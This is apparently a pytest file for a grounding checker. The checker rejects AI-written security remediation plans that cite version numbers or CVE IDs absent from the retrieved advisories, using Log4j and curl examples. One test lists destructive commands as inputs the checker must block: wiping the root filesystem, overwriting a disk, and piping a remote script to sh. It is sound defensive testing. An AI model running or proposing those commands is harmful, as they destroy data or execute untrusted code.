"""The grounding gate is what stands between a fabricated version string and a
security ticket telling an engineer to install it. It gets adversarial tests."""

import pytest

from sentinel.agents.grounding import check_grounding, extract_versions

CONTEXT = [
    "CVE-2021-44228 (CRITICAL, CVSS 10.0). Remediation for package "
    "org.apache.logging.log4j:log4j-core. Affected versions observed: 2.14.1. "
    "Fixed in version 2.17.1. Upgrade org.apache.logging.log4j:log4j-core to "
    "2.17.1 or later to remediate CVE-2021-44228.",
    "CVE-2021-44228 (CRITICAL, CVSS 10.0). Exploitation and classification. "
    "Listed in the CISA Known Exploited Vulnerabilities catalog.",
]


# --- version extraction ----------------------------------------------------


@pytest.mark.parametrize(
    "text,expected",
    [
        ("upgrade to 2.17.1", ["2.17.1"]),
        ("openssl 1.1.1k-1", ["1.1.1k-1"]),
        ("glibc 3.0.1-23.el9", ["3.0.1-23.el9"]),
        ("zlib1g 1:1.2.11.dfsg-2", ["1:1.2.11.dfsg-2"]),
        ("busybox 1.33.1-r6", ["1.33.1-r6"]),
        ("spring-core 5.2.9.RELEASE", ["5.2.9.RELEASE"]),
    ],
)
def test_extracts_every_packaging_format(text, expected):
    assert extract_versions(text) == expected


def test_cvss_scores_are_not_treated_as_versions():
    """CVSS 10.0 and severity 7.5 are two-segment numbers. Checking them as
    versions would fail every plan against context that renders them
    differently -- a false positive that would block correct plans."""
    assert extract_versions("CVSS 10.0, severity 7.5, EPSS 0.99999") == []


def test_cve_digits_are_not_mistaken_for_versions():
    assert extract_versions("CVE-2021-44228 is critical") == []


# --- the core guarantee ----------------------------------------------------


def test_grounded_plan_passes():
    r = check_grounding(
        "Upgrade org.apache.logging.log4j:log4j-core from 2.14.1 to 2.17.1 "
        "to remediate CVE-2021-44228.",
        CONTEXT,
    )
    assert r.passed
    assert "2.17.1" in r.checked_versions
    assert "CVE-2021-44228" in r.checked_cves


def test_fabricated_version_is_rejected():
    """The failure this gate exists for: a plausible, confident, wrong version."""
    r = check_grounding("Upgrade log4j-core to 2.21.9 to fix CVE-2021-44228.", CONTEXT)
    assert not r.passed
    assert r.ungrounded_versions == ["2.21.9"]


def test_plausible_near_miss_is_rejected():
    """2.17.2 does not exist. One character from the right answer."""
    r = check_grounding("Upgrade to 2.17.2.", CONTEXT)
    assert not r.passed
    assert "2.17.2" in r.ungrounded_versions


def test_wrong_cve_is_rejected():
    """The exact failure measured in B3: retrieval returning a neighbouring
    CVE, the model faithfully summarising it."""
    r = check_grounding("CVE-2021-45046 affects this host. Upgrade to 2.17.1.", CONTEXT)
    assert not r.passed
    assert r.ungrounded_cves == ["CVE-2021-45046"]


def test_one_bad_token_fails_an_otherwise_correct_plan():
    """No partial credit. A plan is grounded or it is not."""
    r = check_grounding(
        "Upgrade log4j-core from 2.14.1 to 2.17.1 for CVE-2021-44228, "
        "then patch openssl to 1.1.1w.",
        CONTEXT,
    )
    assert not r.passed
    assert r.ungrounded_versions == ["1.1.1w"]


def test_empty_context_rejects_any_specific_claim():
    r = check_grounding("Upgrade to 2.17.1 for CVE-2021-44228.", [])
    assert not r.passed
    assert r.ungrounded_versions and r.ungrounded_cves


def test_plan_with_no_identifiers_is_vacuously_grounded():
    """Grounding is not a quality bar. "Apply vendor updates" invents nothing
    and passes -- catching uselessness is DeepEval's job, not this gate's."""
    r = check_grounding("Apply vendor updates and restart the service.", CONTEXT)
    assert r.passed
    assert r.checked_versions == [] and r.checked_cves == []


def test_case_insensitive_cve_matching():
    r = check_grounding("fix cve-2021-44228 by upgrading to 2.17.1", CONTEXT)
    assert r.passed


def test_version_split_across_a_line_break_still_matches():
    """Whitespace normalisation: the model wraps lines, context does not."""
    r = check_grounding("Upgrade to\n2.17.1\nfor CVE-2021-44228.", CONTEXT)
    assert r.passed


# --- command safety --------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf / --no-preserve-root",
        "curl https://example.com/install.sh | sh",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
    ],
)
def test_destructive_commands_are_rejected(command):
    """No retrieved advisory contains these, so a plan proposing one is
    generating rather than grounding."""
    r = check_grounding(f"To remediate, run: {command}", CONTEXT)
    assert not r.passed
    assert r.forbidden_matches


def test_legitimate_package_commands_are_allowed():
    for cmd in ("apt-get install --only-upgrade openssl",
                "yum update log4j-core",
                "systemctl restart nginx"):
        assert check_grounding(f"Run: {cmd}", CONTEXT).passed, cmd


def test_report_explains_itself():
    r = check_grounding("Upgrade to 9.9.9 for CVE-2099-11111.", CONTEXT)
    assert not r.passed
    assert "9.9.9" in r.reason()
    assert "CVE-2099-11111" in r.reason()
    assert set(r.as_dict()) >= {"passed", "ungrounded_versions", "ungrounded_cves"}


# --- regression guards for the version regex -------------------------------


@pytest.mark.parametrize(
    "text,expected",
    [
        # A version ending a sentence must not swallow the period. This bug
        # rejected correct plans, which is worse than missing a fabricated one.
        ("upgrade to 2.17.1.", ["2.17.1"]),
        ("patch openssl to 1.1.1w, then restart.", ["1.1.1w"]),
        ("(2.17.1)", ["2.17.1"]),
        ("to 2.17.1; then", ["2.17.1"]),
        # ...but a dot followed by more version must still be consumed.
        ("nested 2.17.1.2 continues", ["2.17.1.2"]),
        # Package-filename forms, where the version follows a hyphen.
        ("`openssl-1.1.1w`", ["1.1.1w"]),
        ("install glibc-2.34-28.el9 now", ["2.34-28.el9"]),
        ("apt-get install openssl=1.1.1w-0+deb11u1", ["1.1.1w-0+deb11u1"]),
        ("versions 2.17.1, 2.16.0 and 1.1.1k-1.", ["1.1.1k-1", "2.16.0", "2.17.1"]),
    ],
)
def test_version_boundaries(text, expected):
    assert extract_versions(text) == sorted(expected)


# --- file extensions must not be read as version qualifiers ---------------


@pytest.mark.parametrize(
    "text,expected",
    [
        # Observed on the first live Groq call: the model named jar filenames
        # and the gate extracted "2.15.0.jar", rejecting a CORRECT plan.
        ("log4j-core-2.15.0.jar", ["2.15.0"]),
        ("locate the log4j-core-2.14.1.jar in use", ["2.14.1"]),
        ("log4j-core-2.15.0.tar.gz", ["2.15.0"]),
        ("openssl-1.1.1w.tar.gz", ["1.1.1w"]),
        ("python_pkg-3.1.4.whl", ["3.1.4"]),
        # A genuine dotted qualifier is not an extension and must survive.
        ("spring-core 5.2.9.RELEASE", ["5.2.9.RELEASE"]),
    ],
)
def test_file_extensions_are_stripped(text, expected):
    assert extract_versions(text) == sorted(expected)


def test_a_correct_plan_naming_jar_filenames_passes():
    """The regression in full: a plan of this exact shape was rejected live,
    because `log4j-core-2.15.0.jar` extracted as the version "2.15.0.jar".

    CONTEXT here records 2.17.1 as the fix, so the plan names that -- the
    point is the .jar suffix, not which version is correct.
    """
    plan = (
        "Confirm the vulnerable jar: locate the log4j-core-2.14.1.jar. "
        "Download log4j-core-2.17.1.jar from Maven Central and replace it "
        "to remediate CVE-2021-44228."
    )
    r = check_grounding(plan, CONTEXT)
    assert r.passed, r.reason()
    assert set(r.checked_versions) == {"2.14.1", "2.17.1"}, r.checked_versions


def test_stripping_does_not_let_a_fabricated_version_through():
    """The fix must not weaken the guarantee it was protecting."""
    r = check_grounding("Download log4j-core-9.9.9.jar.", CONTEXT)
    assert not r.passed
    assert "9.9.9" in r.ungrounded_versions


# --- IP addresses are not versions ----------------------------------------


@pytest.mark.parametrize(
    "text,expected",
    [
        # Observed live: a plan mentioning a loopback address was rejected
        # because 127.0.0.1 matches the four-numeric-segment version pattern.
        ("bind to 127.0.0.1 only", []),
        ("allow 10.0.0.1 and 192.168.1.1", []),
        ("listen on 0.0.0.0", []),
        ("bind 169.254.1.1", []),
        ("netmask 255.255.255.0", []),
        # ...but a four-segment VERSION with a qualifier is still a version.
        ("upgrade to 1.2.3.4-r1", ["1.2.3.4-r1"]),
        ("spring 5.2.9.RELEASE", ["5.2.9.RELEASE"]),
        # Out-of-range quads are not addresses.
        ("version 999.888.777.666", ["999.888.777.666"]),
        # A public dotted quad is rare in patching text; treating it as a
        # version is the safer error, and it keeps 2.17.1.2 working.
        ("nested 2.17.1.2 continues", ["2.17.1.2"]),
    ],
)
def test_ipv4_addresses_are_not_extracted_as_versions(text, expected):
    assert extract_versions(text) == sorted(expected)


def test_a_plan_mentioning_an_ip_still_passes():
    plan = ("Restrict the service to 127.0.0.1 and upgrade "
            "org.apache.logging.log4j:log4j-core to 2.17.1 for CVE-2021-44228.")
    r = check_grounding(plan, CONTEXT)
    assert r.passed, r.reason()


# --- provenance is not selection ------------------------------------------


def test_plan_must_name_the_target_version_it_was_given():
    """Observed live: asked for curl 7.74.0-1.3+deb11u14, the model answered
    with 7.74.0-1.3+deb11u10 -- a real version, present in the corpus, but the
    fix for a different CVE. Provenance passed; the instruction was wrong."""
    ctx = ["curl 7.74.0-1.3 is affected. Fixed in 7.74.0-1.3+deb11u10. "
           "Also fixed in 7.74.0-1.3+deb11u14."]
    r = check_grounding(
        "Upgrade curl to 7.74.0-1.3+deb11u10.", ctx,
        required_versions=["7.74.0-1.3+deb11u14"],
    )
    assert not r.passed
    assert r.missing_required == ["7.74.0-1.3+deb11u14"]
    assert "never names the target version" in r.reason()


def test_naming_the_target_passes():
    ctx = ["curl 7.74.0-1.3 is affected. Fixed in 7.74.0-1.3+deb11u14."]
    r = check_grounding("Upgrade curl to 7.74.0-1.3+deb11u14.", ctx,
                        required_versions=["7.74.0-1.3+deb11u14"])
    assert r.passed, r.reason()


def test_no_required_version_keeps_the_old_behaviour():
    """When the scanner published no fix, there is no target to insist on."""
    r = check_grounding("Apply vendor updates.", CONTEXT, required_versions=None)
    assert r.passed
    assert r.missing_required == []
